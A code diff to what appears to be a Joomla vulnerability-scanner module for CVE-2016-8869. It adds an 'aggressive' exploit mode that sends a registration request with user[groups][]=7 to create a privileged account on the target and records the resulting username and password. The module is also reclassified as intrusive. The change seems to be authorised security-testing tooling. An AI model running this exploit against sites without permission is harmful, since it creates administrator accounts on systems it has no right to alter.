@@ -3,7 +3,8 @@ from __future__ import annotations
 from typing import Any
 
 from ...core.versions import parse_version_safe
-from .advisory import passive_core_finding, passive_only_check
+from .advisory import passive_core_finding
+from .registration_probe import submit_registration
 
 CVE_ID = "CVE-2016-8869"
 NAME = "Joomla registration privilege escalation"
@@ -23,6 +24,9 @@ def check(
     target_url: str,
     joomla_version: str | None = None,
     run_exploit_check: bool = False,
+    timeout: int = 12,
+    proxy: str | None = None,
+    exploit_mode: str = "safe",
     **kwargs: Any,
 ):
     finding = passive_core_finding(
@@ -33,7 +37,32 @@ def check(
         classify=classify_version,
         remediation="Upgrade Joomla to 3.6.4 or a currently supported release and audit privileged users.",
     )
-    return passive_only_check(finding, run_exploit_check)
+    finding.exploit_available = True
+    if not run_exploit_check or finding.status != "LIKELY_VULNERABLE":
+        return finding
+    if exploit_mode != "aggressive":
+        finding.detail += " Privileged account creation is mutating and is available only in aggressive mode."
+        return finding
+    proof = submit_registration(target_url, group=7, timeout=timeout, proxy=proxy)
+    finding.exploit_ran = proof["sent"]
+    finding.proof_url = proof["proof_url"]
+    if not proof["sent"]:
+        finding.status = "NOT_CONFIRMED"
+        finding.confidence = "LOW"
+        finding.detail = proof["reason"]
+    elif proof["accepted"]:
+        finding.status = "AGGRESSIVE_SENT"
+        finding.confidence = "MEDIUM"
+        finding.detail = (
+            "The legacy user.register request with user[groups][]=7 was accepted without an explicit rejection. "
+            f"Disposable administrator candidate: {proof['username']} / {proof['password']} ({proof['email']}). "
+            "The request proves reachability, but administrator access was not claimed without a verified login."
+        )
+    else:
+        finding.status = "NOT_CONFIRMED"
+        finding.confidence = "MEDIUM"
+        finding.detail = f"The privileged registration request was rejected (HTTP {proof['status']})."
+    return finding
 
 
 def metadata() -> dict[str, Any]:
@@ -44,10 +73,10 @@ def metadata() -> dict[str, Any]:
         "component": "Joomla core",
         "affected_rule": AFFECTED_RULE,
         "affected_joomla_versions": [">=3.4.4,<3.6.4"],
-        "exploit_available": False,
-        "exploit_modes": [],
-        "intrusive": False,
-        "module_version": "1.0.0",
+        "exploit_available": True,
+        "exploit_modes": ["aggressive"],
+        "intrusive": True,
+        "module_version": "1.1.0",
         "last_reviewed": "2026-10-03",
         "updated": "2026-10-03",
         "required_detectors": [],
